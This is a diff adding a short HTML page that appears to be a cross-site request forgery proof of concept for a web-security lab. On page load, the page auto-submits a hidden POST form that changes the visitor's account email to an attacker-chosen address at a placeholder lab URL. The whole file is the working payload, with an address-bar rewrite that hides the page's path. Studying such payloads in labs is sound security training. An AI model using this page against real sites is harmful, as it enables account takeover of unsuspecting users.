@@ -1,0 +1,12 @@
+<html>
+<body>
+<script>history.pushState('','','/')</script>
+<form action="https://your-lab-id/email/change-email" method="POST">
+<input type="hidden" name="email" value="kiddie&#64;test&#46;com">
+<input type="submit" value="Submit request">
+</form>
+<script>
+  document.forms[0].submit();
+</script>
+</body>                   
+</html>
